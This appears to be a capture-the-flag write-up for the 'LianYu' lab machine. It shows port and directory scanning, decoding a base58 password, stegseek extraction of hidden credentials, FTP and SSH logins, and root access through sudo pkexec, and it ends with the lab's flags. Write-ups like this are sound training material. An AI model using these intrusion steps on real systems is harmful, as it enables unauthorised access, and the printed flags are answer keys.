# LianYu
---

## Recon
**Port Scan**
```sh
└─$ sudo nmap -sS -sV -O  10.10.173.121 -vv                        

21/tcp  open  ftp     syn-ack ttl 60 vsftpd 3.0.2
22/tcp  open  ssh     syn-ack ttl 60 OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp  open  http    syn-ack ttl 60 Apache httpd
111/tcp open  rpcbind syn-ack ttl 60 2-4 (RPC #100000)

```
- After enumerating a little bit about RPC I didn't found any vulnerability for that particular version

- In the webpage we found this!
![alt text](image.png)
- But I didn't find any important info in the comment on its source-code

**Directory Enumeration**
```sh
└─$ gobuster dir -u http://10.10.173.121/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o directory.txt 

/island
```
![alt text](image-1.png)
- We found an important code word - `vigilante`
- I searched about this word but found noting interesting

```sh
└─$ gobuster dir -u http://10.10.173.121/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o directory.txt

/2100
```
- `http://10.10.173.121/island/2100/` here we found a video but its been deleted

![alt text](image-2.png)

- There is a hint here `you can avail your .ticket here but how?`. Its telling us to avail something which has `.ticket` extension.
    - **It seems we need to scan for web content in this directory**
    - **Lets use `Seclists`**
    - **At first run this command `sudo apt -y install seclists`**
```sh
└─$ seclists

> seclists ~ Collection of multiple types of security lists

/usr/share/seclists
├── Discovery
├── Fuzzing
├── IOCs
├── Miscellaneous
├── Passwords
├── Pattern-Matching
├── Payloads
├── Usernames
└── Web-Shells

└─$ sudo gobuster dir -u http://10.10.173.121/island/2100/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x ticket -o directory.txt
/green_arrow.ticket


``` 
![alt text](image-3.png)
- I think it could be a password for ftp or ssh
- Remember we found a code word 
- After using `vigilante` as username and `RTy8yhBQdscX` as password we found nothing at both ssh and ftp
- I think `RTy8yhBQdscX` this could be encoded with any hash format as it is a password
- As I searched online I found that `RTy8yhBQdscX` is a base58 hash Lets crack it!


![alt text](image-4.png)
- Password - `!#th3h00d`

- Lets Try with FTP first
```sh
└─$ ftp 10.10.173.121
Connected to 10.10.173.121.
220 (vsFTPd 3.0.2)
Name (10.10.173.121:******): vigilante
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||24269|).
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.

ftp> mget *
mget Leave_me_alone.png [anpqy?]? y
229 Entering Extended Passive Mode (|||51175|).
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
100% |***************************************************************************************************************************|   499 KiB  118.49 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:04 (113.90 KiB/s)
mget Queen's_Gambit.png [anpqy?]? y
229 Entering Extended Passive Mode (|||56609|).
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
100% |***************************************************************************************************************************|   537 KiB  169.36 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:03 (161.00 KiB/s)
mget aa.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||55026|).
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |***************************************************************************************************************************|   186 KiB  182.20 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:01 (156.34 KiB/s)

ftp> mget .other_user
mget .other_user [anpqy?]? y
229 Entering Extended Passive Mode (|||7407|).
150 Opening BINARY mode data connection for .other_user (2483 bytes).
100% |***************************************************************************************************************************|  2483        5.11 MiB/s    00:00 ETA
226 Transfer complete.
2483 bytes received in 00:00 (14.08 KiB/s)
```

```sh
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ ls
 Leave_me_alone.png  "Queen's_Gambit.png"   aa.jpg   directory.txt
                                                                                                                                                                        
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ ls                            
 Leave_me_alone.png  "Queen's_Gambit.png"   aa.jpg   directory.txt
                                                                                                                                                                        
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ stegseek -sf aa.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".

                                                                                                                                                                        
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ ls
 Leave_me_alone.png  "Queen's_Gambit.png"   aa.jpg   aa.jpg.out   directory.txt
                                                                                                                                                                        
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ file aa.jpg.out  
aa.jpg.out: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                                                                        
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ unzip aa.jpg.out
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado                   
                                                                                                                                                                        
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ ls     
 Leave_me_alone.png  "Queen's_Gambit.png"   aa.jpg   aa.jpg.out   directory.txt   passwd.txt   shado
                                                                                                                                                                        
┌──(******㉿kali)-[~/CTF{}/THM/lianyu]
└─$ cat shado     
M3tahuman
```
- It could be a Password
```sh
└─$ cat .other_user 
Slade Wilson was 16 years old 
```
- `slade` could be uesr name for ssh

## Privilege Escalation
```sh
slade@LianYu:~$ ls 
user.txt
slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak

slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ 
slade@LianYu:~$ 
slade@LianYu:~$ 
slade@LianYu:~$     sudo pkexec /bin/sh
# ls
ls: not found
# ls
root.txt
# cat root.txt  
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

```

### user.txt : `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`
### root.txt :`THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`